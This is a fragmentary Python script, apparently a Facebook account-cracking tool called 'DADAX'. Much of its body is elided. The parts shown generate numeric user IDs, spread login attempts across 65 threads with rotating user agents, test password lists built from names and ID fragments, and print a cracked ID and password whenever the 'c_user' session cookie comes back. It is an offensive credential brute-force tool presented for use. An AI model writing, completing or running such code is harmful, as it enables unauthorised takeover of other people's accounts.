...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> DADAX  VERSION :\x1b[1;92m 1.0 ')
			linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[DADAX] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SILENT+AWAIS:
				print('\r\r\033[1;31m[DADAX] %s | %s'%(ids,pas))
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[DADAX] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def random_number1():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		print('\x1b[1;91m[*] SAB CHOR GAYE AB MAIN ALONE HO😳 ')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode]
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mDADAX\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
